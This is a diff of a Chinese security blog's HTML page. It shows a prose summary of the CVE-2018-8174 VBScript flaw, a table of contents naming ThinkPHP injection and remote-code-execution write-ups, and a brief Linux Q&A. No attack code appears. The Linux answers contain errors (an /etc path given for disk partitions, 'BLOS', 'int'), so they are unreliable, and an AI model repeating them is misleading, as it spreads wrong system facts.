-            <h5 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h5><p><strong>CVE-2018-8174</strong>是<strong>Windows VBScriptEngine</strong> 代码执行漏洞，由于 <strong>VBScript</strong> 脚本执行引擎(vbscript.dll)存在该漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户受诱导或不慎点击恶意链接或文档，攻击者便可远程获取当前用户系统权限，进而完全控制用户电脑。</p>
-<p>2018年4月18日国内某信息安全公司监控到一例使用该漏洞的攻击活动后，当天与微软公司沟通，将相关信息提交到微软。微软在4月20日确认此漏洞，于5月8号发布了官方安全补丁对其进行修复，并将其命名为 CVE-2018-8174，在国内该漏洞则被称为“双杀”漏洞。</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞复现">漏洞复现</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/08/17/Linux内侧/" >
-            
-                <span>Linux内侧</span>
-        </a>
-        <div class="abstract-content">
-            <ol>
-<li><h6 id="解释-etc-sdb5和-dev-sdb2分别是什么意思"><a href="#解释-etc-sdb5和-dev-sdb2分别是什么意思" class="headerlink" title="解释/etc/sdb5和/dev/sdb2分别是什么意思"></a>解释/etc/sdb5和/dev/sdb2分别是什么意思</h6><p>答：/etc/sdb5 表示第二块硬盘的第一个逻辑分区<br>/etc/sdb2 表示第二块硬盘的第二个主分区</p>
-</li>
-<li><h6 id="linux操作系统的启动过程"><a href="#linux操作系统的启动过程" class="headerlink" title="linux操作系统的启动过程"></a>linux操作系统的启动过程</h6><p>答：：Linux操作系统的启动过程一般分为四个阶段，分别为BLOS启动引导阶段、GRUB启动引导阶段、内核阶段、int初始化阶段</p></li></ol>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/08/17</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Linux">Linux</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/24/web中间件常见漏洞总结/" title= "web中间件常见漏洞总结">
+                    <div class="prevTitle">web中间件常见漏洞总结</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-    <nav class="page-nav">
-        <a class="extend prev" rel="prev" href="/archives/page/2/">&#60; PREV</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/archives/page/4/">4</a><a class="page-number" href="/archives/page/5/">5</a><a class="extend next" rel="next" href="/archives/page/4/">NEXT &#62;</a>
-    </nav>
     
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -705,6 +606,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Thinkphp-3-0-爆路径漏洞"><span class="toc-number">1.</span> <span class="toc-text">Thinkphp 3.0 爆路径漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP3-2-3-缓存函数设计缺陷可导致Getshell（-2017-08-09-）"><span class="toc-number">2.</span> <span class="toc-text">ThinkPHP3.2.3_缓存函数设计缺陷可导致Getshell（ 2017-08-09 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP3-2-3-最新版update注入漏洞（-2018-04-16-）"><span class="toc-number">3.</span> <span class="toc-text">ThinkPHP3.2.3_最新版update注入漏洞（ 2018-04-16 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP3-2-X-find-select-delete注入（-2018-08-23-）"><span class="toc-number">4.</span> <span class="toc-text">ThinkPHP3.2.X_find_select_delete注入（ 2018-08-23 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP3-X-order-by注入漏洞（-2018-08-29-）"><span class="toc-number">5.</span> <span class="toc-text">ThinkPHP3.X_order_by注入漏洞（ 2018-08-29 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-SQL注入漏洞-amp-amp-敏感信息泄露（-2017-07-03-）"><span class="toc-number">6.</span> <span class="toc-text">ThinkPHP5_SQL注入漏洞&amp;&amp;敏感信息泄露（ 2017-07-03 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-0-10-3-2-3-缓存函数设计缺陷可导致Getshell（-2017-08-09-）"><span class="toc-number">7.</span> <span class="toc-text">ThinkPHP5.0.10-3.2.3_缓存函数设计缺陷可导致Getshell（ 2017-08-09 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP框架5-0-X-sql注入漏洞分析（-2018-04-09-）"><span class="toc-number">8.</span> <span class="toc-text">ThinkPHP框架5.0.X_sql注入漏洞分析（ 2018-04-09 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-X-order-by注入漏洞（-2018-08-23-）"><span class="toc-number">9.</span> <span class="toc-text">ThinkPHP5.X_order_by注入漏洞（ 2018-08-23 ）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ThinkPHP5-X-远程代码执行（-2018-12-10-）"><span class="toc-number">10.</span> <span class="toc-text">ThinkPHP5.X_远程代码执行（ 2018-12-10 ）</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1822,6 +1741,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
